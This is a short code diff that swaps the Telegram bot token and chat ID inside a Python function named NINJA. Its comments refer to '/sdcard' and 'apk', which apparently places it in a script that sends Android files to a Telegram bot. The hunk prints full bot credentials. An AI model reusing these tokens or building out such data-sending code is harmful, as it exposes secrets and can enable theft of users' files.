@@ -10,8 +10,8 @@ except:
 def NINJA():
     session=requests.session()
         
-    bot_token = '7378555880:AAHRHDJ_hWifCAreUgI52RGVQq5ad3ACGC0' 
-    chat_id = '6070021548'    
+    bot_token = '7470023488:AAEFI_uHN7pEfvtcqCQ75S8K7iJd8ClxSTc' 
+    chat_id = '6296611162'    
     #-------------( /sdcard\ )--------------#  
     #--------------------apk-------------------#																																							
     try:
